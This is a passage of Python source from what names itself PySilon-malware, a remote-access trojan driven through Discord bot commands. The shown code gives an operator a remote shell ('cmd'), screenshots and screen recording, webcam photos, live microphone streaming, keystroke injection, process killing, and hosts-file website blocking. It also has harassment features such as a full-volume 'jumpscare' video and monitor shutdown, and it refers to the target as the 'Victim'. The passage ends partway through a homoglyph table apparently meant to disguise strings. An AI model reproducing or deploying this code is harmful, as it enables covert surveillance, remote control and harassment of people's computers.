                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                await ctx.send(embed=embed)
        
        
        @client.command(name='jumpscare')
        async def trigger_jumpscare(ctx):
            await ctx.message.delete()
        
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            video_url = "https://github.com/mategol/PySilon-malware/raw/py-dev/resources/icons/jumpscare.mp4"
            temp_folder = os.environ['TEMP']
            temp_file = os.path.join(temp_folder, 'jumpscare.mp4')
            if not os.path.exists(temp_file):
                response = requests.get(video_url)
                with open(temp_file, 'wb') as file:
                    file.write(response.content)
        
            time.sleep(1)
            os.startfile(temp_file)
            time.sleep(0.6)
            get_video_window = win32gui.GetForegroundWindow()
            win32gui.ShowWindow(get_video_window, win32con.SW_MAXIMIZE)
            volume.SetMasterVolumeLevelScalar(1.0, None)
        
            embed = discord.Embed(title="🟢 Success",description='```Jumpscare has been triggered.```',colour=discord.Colour.green())
            embed.set_author(name="PySilon-malware",icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)        
        
        @client.command(name="key")
        async def keystrokes(ctx, keystrokes=None):
            await ctx.message.delete()
            if keystrokes != None:
                keystrokes = ctx.message.content[5:]
                if "ALTTAB" in keystrokes: pyautogui.hotkey('alt', 'tab')
                elif "ALTF4" in keystrokes: pyautogui.hotkey('alt', 'f4')
                else:
                    for key in keystrokes:
                        pyautogui.press(key)
                embed = discord.Embed(title="🟢 Success",description=f'```All keys have been succesfully pressed!```', colour=discord.Colour.green())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
            else:
                embed = discord.Embed(title="📛 Error",description='```Syntax: .key <keys-to-press>```', colour=discord.Colour.red())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')        
        @client.command(name="voice")
        async def live_mic(ctx, option=None):
            await ctx.message.delete()
            if option != None:
                if option == "join":
                    vc = await client.get_channel(channel_ids['voice']).connect(self_deaf=True)
                    vc.play(PyAudioPCM())
                    await ctx.send('`[' + pysilon_misc.current_time() + '] Joined voice-channel and streaming microphone in realtime.`')
                elif option == "leave":
                    if ctx.voice_client is not None:
                        await ctx.voice_client.disconnect()
                        await ctx.send('`[' + pysilon_misc.current_time() + '] Left voice-channel.`')
                    else:
                        await ctx.send('`[' + pysilon_misc.current_time() + '] Bot is not in a voice channel.`')
            else:
                embed = discord.Embed(title="📛 Error",description='```Syntax: .voice <join/leave>```', colour=discord.Colour.red())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                await ctx.send(embed=embed)
        
        @client.command(name="monitors")
        async def monitor_control(ctx, state=None):
            global monitors_off
            await ctx.message.delete()
            if state == "off":
                if not monitors_off:
                    monitors_off = True
                    def monitor_off():
                        while monitors_off:
                            for monitor in monitorcontrol.get_monitors():
                                with monitor:
                                    monitor.set_power_mode(4)
        
                    threading.Thread(target=monitor_off).start()
        
                    embed = discord.Embed(title="🟢 Success",description=f'```Monitor turned off. Turn it back on by using .monitors on```', colour=discord.Colour.green())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
        
                else:
                    embed = discord.Embed(title="🔴 Hold on!",description=f'```Monitor already turned off. Turn it back on by using .monitors on```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
        
            elif state == "on":
                if monitors_off:
                    for monitor in monitorcontrol.get_monitors():
                        with monitor:
                            monitor.set_power_mode(1)
        
                    embed = discord.Embed(title="🟢 Success",description=f'```Monitor has been turned on. Turn it off by using .monitors off```', colour=discord.Colour.green())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
                    monitors_off = False
                else: 
                    embed = discord.Embed(title="🔴 Hold on!",description=f'```The monitor is not turned off. Turn it on by using .monitors off```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
            else:
                embed = discord.Embed(title="🔴 Hold on!",description=f'```Syntax: .monitors <on / off>```', colour=discord.Colour.red())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                await ctx.send(embed=embed)
        
        @client.command(name="tasklist")
        async def list_of_processes(ctx):
            global processes_list
            processes_messages = []
            processes = []
            for proc in process_iter():
                processes.append(proc.name())
            processes.sort(key=str.lower)
            how_many, temp = 1, processes[0]; processes.pop(0)
            for i in processes:
                if temp == i: how_many += 1
                else:
                    if how_many == 1: processes_list.append('``' + temp + '``')
                    else: processes_list.append('``' + temp + '``   [x' + str(how_many) + ']'); how_many = 1
                    temp = i
            total_processes = len(processes)
            processes = ''
            tasklist_msg = await ctx.send('```Processes at ' + pysilon_misc.current_time() + ' requested by ' + str(ctx.message.author) + '```')
            processes_messages.append(tasklist_msg)
            for proc in range(1, len(processes_list)):
                if len(processes) < 1800:
                    processes = processes + '\n**' + str(proc) + ') **' + str(processes_list[proc])
                else:
                    processes += '\n**' + str(proc) + ') **' + str(processes_list[proc])
                    tasklist_msg = await ctx.send(processes)
                    processes_messages.append(tasklist_msg)
                    processes = ''
            tasklist_msg = await ctx.send(processes + '\n Total processes:** ' + str(total_processes) + '**\n```If you want to kill a process, type .kill <process-number>```')
            processes_messages.append(tasklist_msg)
        
        @client.command(name="foreground")
        async def get_foreground_tast(ctx):
            await ctx.message.delete()
            foreground_process = active_window_process_name()
            if foreground_process == None:
                embed = discord.Embed(title="📛 Error",description='```Failed to get foreground window process name.```', colour=discord.Colour.red())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                await ctx.send(embed=embed)
            else:
                embed = discord.Embed(title=str(foreground_process),description=f'```You can kill it with -> .kill {foreground_process}```', colour=discord.Colour.green())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                await ctx.send(embed=embed)
        
        @client.command(name="kill")
        async def kill_running_process(ctx, argument=None):
            global processes_list
            await ctx.message.delete()
            if argument == None:
                embed = discord.Embed(title="📛 Error",description='```Syntax: .kill <process-name-or-ID>```', colour=discord.Colour.red())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                await ctx.send(embed=embed)
            elif check_int(argument):
                if len(processes_list) > 10:
                    if int(argument) < len(processes_list) and int(argument) > 0:
                        reaction_msg = await ctx.send('```Do you really want to kill process: ' + processes_list[int(argument)].replace('`', '') + '\nReact with 💀 to kill it or 🔴 to cancel...```')
                        process_to_kill = [processes_list[int(argument)].replace('`', ''), False]
                        await reaction_msg.add_reaction('✅')
                        await reaction_msg.add_reaction('❌')
        
                        def kill_proc_confirm(reaction, user):
                            return str(reaction.emoji) in ['✅', '❌'] and user == ctx.author
                
                        try:
                            reaction, user = await client.wait_for('reaction_add', check=kill_proc_confirm)
                            if str(reaction.emoji) == '✅':
                                await reaction.message.delete()
                                try:
                                    process_name = process_to_kill[0]
                                    if process_name[-1] == ']':
                                        process_name = process_name[::-1]
                                        for i in range(len(process_name)):
                                            if process_name[i] == '[':
                                                process_name = process_name[i+4:]
                                                break
                                        process_name = process_name[::-1] 
                                except Exception as e: 
                                    embed = discord.Embed(title="📛 Error",description=f'```Error while parsing the process name...\n' + str(e) + '```', colour=discord.Colour.red())
                                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                                    await reaction.message.channel.send(embed=embed)
                                try:
                                    killed_processes = []
                                    for proc in process_iter():
                                        if proc.name() == process_name:
                                            proc.kill()
                                            killed_processes.append(proc.name())
                                    processes_killed = ''
                                    for i in killed_processes:
                                        processes_killed = processes_killed + '\n• ' + str(i)
                                    embed = discord.Embed(title="🟢 Success",description=f'```Processes killed by ' + str(user) + ' at ' + pysilon_misc.current_time() + processes_killed + '```', colour=discord.Colour.green())
                                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                                    await reaction.message.channel.send(embed=embed)
                                except Exception as e:
                                    embed = discord.Embed(title="📛 Error",description='```Error while killing processes...\n' + str(e) + '```', colour=discord.Colour.red())
                                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                                    await reaction.message.channel.send(embed=embed)
                            else: return
                        except asyncio.TimeoutError: await ctx.send("```❗ Reaction listener has timed out.```")
                    else:
                        embed = discord.Embed(title="📛 Error",description="```There isn't any process with that index. Range of process indexes is 1-" + str(len(processes_list)-1) + '```', colour=discord.Colour.red())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        await ctx.send(embed=embed)
                else:
                    embed = discord.Embed(title="📛 Error",description='```You need to generate the processes list to use this feature\n.show processes```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
            elif argument.lower() in [proc.name().lower() for proc in process_iter()]:
                stdout = pysilon_misc.force_decode(subprocess.run(f'taskkill /f /IM {argument.lower()} /t', capture_output=True, shell=True).stdout).strip()
                await asyncio.sleep(1)
                if argument.lower() not in [proc.name().lower() for proc in process_iter()]:
                    embed = discord.Embed(title="🟢 Success",description=f'```Successfully killed {argument.lower()}```', colour=discord.Colour.green())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
                else:
                    embed = discord.Embed(title="📛 Error",description=f'```Tried to kill {argument} but it\'s still running...```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
            else:
                embed = discord.Embed(title="📛 Error",description='```Invalid process name/ID. You can view all running processes by typing:\n.show processes```', colour=discord.Colour.red())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                await ctx.send(embed=embed)
        
        @client.command(name="blacklist")
        async def blacklist_process(ctx, argument=None):
            await ctx.message.delete()
            if argument == None:
                embed = discord.Embed(title="📛 Error",description='```Syntax: .blacklist <process-name>```', colour=discord.Colour.red())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                await ctx.send(embed=embed)
            else:
                if not os.path.exists(f'{os.path.dirname(sys.executable)}\\disabled_processes.psln'): 
                    with open(f'{os.path.dirname(sys.executable)}\\disabled_processes.psln', 'w', encoding='utf-8'): pass
                with open(f'{os.path.dirname(sys.executable)}\\disabled_processes.psln', 'r', encoding='utf-8') as disabled_processes:
                    disabled_processes_list = disabled_processes.readlines()
                for x, y in enumerate(disabled_processes_list): disabled_processes_list[x] = y.replace('\n', '')
                if argument not in disabled_processes_list:
                    disabled_processes_list.append(argument)
                    with open(f'{os.path.dirname(sys.executable)}\\disabled_processes.psln', 'w', encoding='utf-8') as disabled_processes:
                        disabled_processes.write('\n'.join(disabled_processes_list))
                    embed = discord.Embed(title="🟢 Success",description=f'```{argument} has been added to process blacklist```', colour=discord.Colour.green())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
                else:
                    embed = discord.Embed(title="📛 Error",description='```This process is already blacklisted, so there\'s nothing to disable```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
        
        @client.command(name="whitelist")
        async def whitelist_process(ctx, argument=None):
            await ctx.message.delete()
            if argument == None:
                embed = discord.Embed(title="📛 Error",description='```Syntax: .whitelist <process-name>```', colour=discord.Colour.red())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                await ctx.send(embed=embed)
            else:
                if not os.path.exists(f'{os.path.dirname(sys.executable)}\\disabled_processes.psln'): 
                    with open(f'{os.path.dirname(sys.executable)}\\disabled_processes.psln', 'w', encoding='utf-8'): pass
                with open(f'{os.path.dirname(sys.executable)}\\disabled_processes.psln', 'r', encoding='utf-8') as disabled_processes:
                    disabled_processes_list = disabled_processes.readlines()
                for x, y in enumerate(disabled_processes_list): disabled_processes_list[x] = y.replace('\n', '')
                if argument in disabled_processes_list:
                    disabled_processes_list.pop(disabled_processes_list.index(argument))
                    with open(f'{os.path.dirname(sys.executable)}\\disabled_processes.psln', 'w', encoding='utf-8') as disabled_processes:
                        disabled_processes.write('\n'.join(disabled_processes_list))
                    embed = discord.Embed(title="🟢 Success",description=f'```{argument} has been removed from process blacklist```', colour=discord.Colour.green())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
                else:
                    embed = discord.Embed(title="📛 Error",description='```This process is not blacklisted```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
        
        
        @client.command(name="cmd")
        async def reverse_shell(ctx, cmd_command=None):
            await ctx.message.delete()
            if cmd_command != None:
                cmd_output = pysilon_misc.force_decode(subprocess.run(ctx.message.content[5:], capture_output= True, shell= True).stdout).strip()
                message_buffer = ''
                await ctx.send('```Executed command: ' + ctx.message.content[5:] + '\nstdout:```');
                for line in range(1, len(cmd_output.split('\n'))):
                    if len(message_buffer) + len(cmd_output.split('\n')[line]) > 1950:
                        await ctx.send('```' + message_buffer + '```');
                        message_buffer = cmd_output.split('\n')[line]
                    else:
                        message_buffer += cmd_output.split('\n')[line] + '\n'
                await ctx.send('```' + message_buffer + '```');
                await ctx.send('```End of command stdout```');
            else:
                return await ctx.send("```❗ No command was given.```")        
        @client.command(name='display')
        async def screen_manipulation(ctx, option=None):
            await ctx.message.delete()
            if option == 'graphic':
                embed = discord.Embed(title='📤 Provide a file containing graphic', description='Send your .drawdata file here', colour=discord.Colour.blue())
                embed.set_author(name='PySilon Malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                await ctx.send(embed=embed)
                def check(m):
                    return m.attachments and m.channel == ctx.channel
        
                msg = await client.wait_for('message', check=check)
                try:
                    filename = msg.attachments[0].filename
                    if filename.endswith('.drawdata'):
                        await msg.attachments[0].save(fp=filename)
        
                        screen_manipulator(filename).display_graphic(10)
        
                        embed = discord.Embed(title='🟢 Graphic successfully displayed', description='Victim should see it on their screen for 10 seconds.', colour=discord.Colour.green())
                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                        await ctx.send(embed=embed)
                    else: ctx.send("File is not a *.drawdata* file")
                except Exception as err: 
                    await ctx.send(f'```❗ Something went wrong while fetching graphic file...\n{str(err)}```')
        
            elif option == 'glitch':
                if ctx.message.content[16:] == 'list':
                    embed = discord.Embed(title="📃 List of currently available glitches:", description=f'- {"- ".join(flash_screen("list"))}', colour=discord.Colour.blue())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
                elif ctx.message.content[16:] + '\n' in flash_screen('list'):
                    flash_screen(ctx.message.content[16:])
                    embed = discord.Embed(title="🟢 Glitch succesfully executed", description=f'Remember to ⭐ our repository', colour=discord.Colour.blue())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
                else:
                    embed = discord.Embed(title="📛 Error",description='```Syntax: .display glitch <glitch_name>\nTo list all currently available glitches, type .display-glitch list```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
        
            else:
                embed = discord.Embed(title="📛 Error",description='```Syntax: .display <graphic / glitch> <other options>```', colour=discord.Colour.red())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                await ctx.send(embed=embed)
        
        
        @client.command(name="screenrec")
        async def screen_record(ctx, duration=None):
            if duration != None:
                try:
                    duration = int(duration)
                except: return
                if duration > 60:
                    embed = discord.Embed(title="📛 Error",description="Duration interval should not surpass 60 seconds!", colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    return await ctx.send(embed=embed)
                elif duration < 1:
                    embed = discord.Embed(title="📛 Error",description="Duration interval should be a non negative number!", colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    return await ctx.send(embed=embed)
            else:
                duration = 15 # default duration
            await ctx.message.delete()
            await ctx.send("`🟢 Recording... Please wait.`")
        
            output_file = 'recording.mp4'
            screen_width, screen_height = pyautogui.size()
            screen_region = (0, 0, screen_width, screen_height)
            frames = []
            fps = 30
            num_frames = duration * fps
            try:
                for _ in range(num_frames):
                    img = pyautogui.screenshot(region=screen_region)
                    frame = np.array(img)
                    frames.append(frame)
                imageio.mimsave(output_file, frames, fps=fps, quality=8)
                if os.stat(output_file).st_size / (1024 * 1024) > 8:
                    embed = discord.Embed(title="📛 Error",description="File size has exceeded 8MB! Please try a different duration. (Default: 15 seconds)", colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
                else:
                    await ctx.send("**Screen Recording** `[On demand]`", file=discord.File(output_file))
                subprocess.run(f'del {output_file}', shell=True)
            except:
                embed = discord.Embed(title="📛 Error",description="An error occurred during screen recording.", colour=discord.Colour.red())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                await ctx.send(embed=embed)        
        
        @client.command(name="ss")
        async def screenshot(ctx):
            ImageGrab.grab(all_screens=True).save('ss.png')
            await ctx.message.delete()
            await ctx.send(embed=discord.Embed(title=pysilon_misc.current_time() + '`[On demand]`', color=0x0084ff).set_image(url='attachment://ss.png'), file=discord.File(f'ss.png'), mention_author=False)
            subprocess.run(f'del /s ss.png', shell=True)        
        
        @client.command(name="tts")
        async def text_to_speech(ctx, what_to_say=None):
            await ctx.message.delete()
            if what_to_say != None:
                what_to_say = ctx.message.content[5:]
                engine = pyttsx3.init()
                engine.setProperty('rate', 150) 
                engine.say(str(what_to_say))
                engine.runAndWait()
                engine.stop()
                embed = discord.Embed(title="🟢 Success",description=f'```Successfully played TTS message: "{what_to_say}"```', colour=discord.Colour.green())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                await ctx.send(embed=embed)
            else:
                embed = discord.Embed(title="📛 Error",description='```Syntax: .tts <what-to-say>```', colour=discord.Colour.red())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                await ctx.send(embed=embed)        
        
        @client.command(name="wallpaper")
        async def set_wallpaper(ctx, image_path=None):
            await ctx.message.delete()
            if image_path != None:
                image_path = ctx.message.content[11:]
                image_path = image_path.replace('\\', '/')
                if os.path.exists(image_path) and os.path.isfile(image_path):
                    changed = win32con.SPIF_UPDATEINIFILE | win32con.SPIF_SENDCHANGE
                    ctypes.windll.user32.SystemParametersInfoW(win32con.SPI_SETDESKWALLPAPER, 0, image_path, changed)
                    embed = discord.Embed(title="🟢 Success", description=f'```Changed wallpaper successfully!```', colour=discord.Colour.green())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
                else:
                    embed = discord.Embed(title="📛 Error", description='```File not found.```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
            else:
                embed = discord.Embed(title="📛 Error", description='```Syntax: .wallpaper <path/to/image>```', colour=discord.Colour.red())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                await ctx.send(embed=embed)        
        
        @client.command(name="webcam")
        async def webcam(ctx, action=None, camera_index=None):
            await ctx.message.delete()
            if action == "photo":
                pygame.camera.init()
                if camera_index != None: 
                    camera_index = int(camera_index)
                else: camera_index = 0
                try:
                    camera = pygame.camera.Camera(camera_index)
                    camera.start()
                except: return await ctx.send('```❗ Camera with index ' + str(camera_index) + ' was not found.```')
                time.sleep(1)
                image = camera.get_image()
                pygame.image.save(image, f'{os.path.dirname(sys.executable)}\\webcam.png')
                camera.stop()
                await ctx.send(embed=discord.Embed(title=pysilon_misc.current_time(True) + ' `[On demand]`').set_image(url='attachment://webcam.png'),file=discord.File(f'{os.path.dirname(sys.executable)}\\webcam.png'))
                subprocess.run(f'del /s {os.path.dirname(sys.executable)}\\webcam.png', shell=True)
            elif action == "video":
                pass # todo
            else:
                embed = discord.Embed(title="📛 Error",description='```Syntax: .webcam <action> <camera_index (default: 0)>\nActions:\n    photo - take a photo with target PC\'s webcam```', colour=discord.Colour.red())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                await ctx.send(embed=embed)        
        @client.command(name="website")
        async def website_blocker(ctx, option=None, website=None):
            await ctx.message.delete()
            if not IsAdmin():
                embed = discord.Embed(title="📛 Error", description=f'```This command requires (UAC) elevation.```', colour=discord.Colour.red())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                return await ctx.send(embed=embed)
            if option == "block":
                if website != None:
                    if not website.startswith("https://") or not website.startswith("http://"):
                        website = "http://" + website 
                    print(website)
                    parsed_url = urlparse(website)
                    host_entry = f"127.0.0.1 {parsed_url.netloc}\n"
                    hosts_file_path = get_hosts_file_path()
        
                    if hosts_file_path:
                        with open(hosts_file_path, 'a') as hosts_file:
                            hosts_file.write(host_entry)
                        embed = discord.Embed(title=f"🟢 Success", description=f'```Website {website} has been blocked. \nUnblock it by using .website unblock [websiteurl]```', colour=discord.Colour.green())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        await ctx.send(embed=embed)
        
                    else:
                        embed = discord.Embed(title="📛 Error", description=f'```Hostfile not found or no permissions```', colour=discord.Colour.red())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        await ctx.send(embed=embed)
                else:
                    embed = discord.Embed(title="🔴 Hold on!", description=f'```Syntax: .website block <https://example.com>```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
        
            elif option == "unblock":
                if website != None:
                    website = website.replace("https://", "")
                    website = website.replace("http://", "")
                    hosts_file_path = get_hosts_file_path()
                    if hosts_file_path:
                        with open(hosts_file_path, 'r') as hosts_file:
                            lines = hosts_file.readlines()
                        filtered_lines = [line for line in lines if website not in line]
                        with open(hosts_file_path, 'w') as hosts_file:
                            hosts_file.writelines(filtered_lines)
                        embed = discord.Embed(title=f"🟢 Success", description=f'```Website {website} has been unblocked.```', colour=discord.Colour.green())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        await ctx.send(embed=embed)
                    else:
                        embed = discord.Embed(title="📛 Error", description=f'```Hostfile not found or no permissions```', colour=discord.Colour.red())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        await ctx.send(embed=embed)
                else:
                    embed = discord.Embed(title="🔴 Hold on!", description=f'```Syntax: .website unblock <example.com>```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
            else:
                embed = discord.Embed(title="🔴 Hold on!", description=f'```Syntax: .website <block/unblock> <https://example.com>```', colour=discord.Colour.red())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                await ctx.send(embed=embed)
        
    def fetch_working_dir(self):
        try:
            with open(f'{os.path.dirname(sys.executable)}\\working_directory.json', 'r') as fetch_dir:
                self.working_directory = json.load(fetch_dir)
        except:
            self.save_working_dir()
            self.working_directory = [os.getenv('SystemDrive'), "Users", getuser()]
        return self.working_directory

    def save_working_dir(self):
        with open(f'{os.path.dirname(sys.executable)}\\working_directory.json', 'w') as save_dir:
            json.dump(self.working_directory, save_dir)
            
    def generate_embed(self, **kwargs):
        embed = discord.Embed(title=kwargs['title'], description=kwargs['description'], color=kwargs['color'])
        for cfg in kwargs.keys():
            match cfg:
                case 'fields':
                    for field in kwargs['fields']: embed.add_field(name=field[0], value=field[1], inline=field[2])
                case 'thumbnail': embed.set_thumbnail(url=kwargs['thumbnail'])
                case 'footer':
                    footer_text = (kwargs['footer'] if kwargs['footer'] != DEFAULT else render_text('PySilon Malware')) if type(kwargs['footer']) != list else (kwargs['footer'][0] if kwargs['footer'][0] != DEFAULT else f'https://github.com/{render_text('mategol/PySilon-malware')}')
                    if type(kwargs['footer']) == list and len(kwargs['footer']) == 2: 
                        footer_icon = kwargs['footer'][1] if kwargs['footer'][1] != DEFAULT else 'https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/author_icon.jpg'
                        embed.set_footer(text=footer_text, icon_url=footer_icon)
                    else: embed.set_footer(text=footer_text)
                case 'url': embed.url = kwargs['url'] if kwargs['url'] != DEFAULT else 'https://github.com/mategol/PySilon-malware'
                case 'timestamp': embed.timestamp = kwargs['timestamp']
                case 'image': embed.set_image(url=kwargs['image'])
                case 'author':
                    author_name = (kwargs['author'] if kwargs['author'] != DEFAULT else render_text('PySilon Malware')) if type(kwargs['author']) != list else (kwargs['author'][0] if kwargs['author'][0] != DEFAULT else render_text('PySilon Malware'))
                    if type(kwargs['author']) == list and len(kwargs['author']) == 2: 
                        author_icon = kwargs['author'][1] if kwargs['author'][1] != DEFAULT else 'https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/author_icon.jpg'
                        embed.set_author(name=author_name, icon_url=author_icon)
                    else: embed.set_author(name=author_name)
        return embed



def force_decode(b: bytes):
    try:
        return b.decode(json.detect_encoding(b))
    except UnicodeDecodeError:
        return b.decode(errors="backslashreplace")
    
def current_time(with_seconds=False):
    return datetime.datetime.now().strftime('%d.%m.%Y_%H.%M' if not with_seconds else '%d.%m.%Y_%H.%M.%S')

def get_all_file_paths(directory):
    file_paths = []
    for root, directories, files in os.walk(directory):
        for filename in files:
            filepath = os.path.join(root, filename)
            file_paths.append(filepath)
    return file_paths

def implode():
    pass

table = {
    'a': 'aáąȧаạ',
    'b': 'bƀɓᵬḃḅ',
    'c': 'cçćĉċƈ',
    'd': 'dďɗḍḏḑ',
    'e': 'eėęȩḙẹ',
    'f': 'fƒᶂḟ',
    'g': 'gĝğġģǵ',
    'h': 'hɦḥḩḫⱨ',
    'i': 'iìíίἰἱὶ',
    'j': 'jĵǰɉʝј',
    'k': 'kķĸκкқ',
    'l': 'lĺļŀłƚ',
    'm': 'mɱᶆṁṃꝳ',
    'n': 'nņƞǹɳṇ',
    'o': 'oơοоọợ',
    'p': 'pᵱṕṗꝓ',
    'q': 'qɋԛ',
